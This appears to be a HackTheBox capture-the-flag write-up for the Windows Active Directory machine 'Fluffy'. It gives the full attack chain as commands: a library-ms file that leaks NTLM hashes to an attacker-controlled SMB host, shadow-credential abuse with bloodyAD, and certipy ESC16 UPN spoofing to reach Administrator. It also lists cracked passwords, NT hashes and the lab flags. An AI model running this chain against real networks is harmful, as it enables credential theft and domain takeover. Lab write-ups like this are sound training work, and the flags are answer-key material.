```json
Alias: Fluffy
Date: 25-05_2025
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.10.11.69
```

# Fluffy
# Summary

- Pretty hard for an easy machine

# Lessons Learnt

* Tools need to be updated!

---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 19:59 PKT
Nmap scan report for 10.10.11.69
Host is up (0.18s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-25 21:59:27Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-25T22:00:51+00:00; +7h00m05s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T22:00:51+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-25T22:00:51+00:00; +7h00m05s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T22:00:51+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m04s, deviation: 0s, median: 7h00m04s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-05-25T22:00:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.14 seconds

```
## Discovered Subdomains
```
fluffy.htb
```

---
# Enumeration
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

| Username     | Password        |
| ------------ | --------------- |
| j.fleischman | J0elTHEM4n1990! |

---

# Exploitation

We have read/write access to the IT SMB share and it tells us about a few recent vulnerabilities, among those there is CVE-2025-24071. Which works by taking advantage of `library-ms` files. These are files in windows that aggregate content from **multiple physical folders** into a **single logical view**. Due to windows explorer's behavior, it automatically trusts and parses `library-ms` files when they are decompressed from `zip/rar` files.

We can use this to create a `library-ms` file that points to a SMB sever that we control and zip it. Upload the file to the IT share and wait a while for someone to decompress it. When that happens, we should get a connection to our SMB server from that user and get their NET-NTLM hash.

`test.library-ms`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.216\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

zip and upload it using `smbclient`, we get the NET-NTLM for `p.agila`, upon cracking it, we get the creds

| Username | Password        |
| -------- | --------------- |
| p.agila  | prometheusx-303 |

The path to user is now clear

![[Pasted image 20250526041444.png]]

Add ourselves to Service Accounts

```bash
bloodyAD --host dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --dc-ip $IP -d fluffy.htb add groupMember "SERVICE ACCOUNTS" p.agila
```

Add shadow credentials to `winrm_svc`

```bash
bloodyAD --host dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --dc-ip $IP -d fluffy.htb add shadowCredentials 'winrm_svc'
```

Get TGT from cert

```bash
gettgtpkinit -cert-pem $(pwd)/lSS4ODMO_cert.pem -key-pem $(pwd)/lSS4ODMO_priv.pem fluffy.htb/winrm_svc $(pwd)/lSS4ODMO.ccache
```

Get NT hash from TGT

```bash
getnthash -key 'e2c99cfd618252c69973f003a2ee10085919a786f867f51021ef57e14f369423' -dc-ip $IP 'FLUFFY.HTB/winrm_svc'
```

| Username  | Password                         |
| --------- | -------------------------------- |
| winrm_svc | 33bd09dcd697600edf6b3a7af4875767 |

```bash
evil-winrm -i $IP -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

---
# Lateral Movement

Do the same shadow credentials process as above, but this time for `ca_svc`. 

| Username | Password                         |
| -------- | -------------------------------- |
| ca_svc   | ca0f4f9e9eb8a092addf53bb03fc98c8 |

---

# Privilege Escalation

For the next step, make sure you have the latest version of certipy and run as `ca_svc`

```bash
certipy find -u 'winrm_svc' -hashes '33bd09dcd697600edf6b3a7af4875767' -dc-ip $IP -stdout -vulnerable
```

And we find this

```
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

What this means is CA itself is globally configured to disable the inclusion of the `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`) security extension in _all_ certificates it issues. Any certificate it issues won't have the requester's SID, it will use some other means of mapping such as UPN. So, it may be possible to do something like changing our account's UPN to `Administrator`, requesting a certificate then changing it back to what it was.

Then, when we try to use the certificate, It will map us to the Administrator account.

Change `ca_svc` upn to administrator

```bash
certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip $IP -upn 'administrator' -user 'ca_svc' update
```

Request certificate as `ca_svc`

```bash
certipy req -k -dc-ip $IP -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
```

Revert upn back to original

```bash
certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip $IP -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

Authenticate using the cert

```bash
certipy auth -dc-ip $IP -pfx administrator.pfx -username administrator -domain fluffy.htb
```

| Username      | Password                         |
| ------------- | -------------------------------- |
| Administrator | 8da83a3fa618b6e3a00e93f676c92a6e |

---

# Flags
- e3275a8c1b190a24035691ab403e2fe6
- 74d683e2c1acb596bce7592d5de586b1

#CTF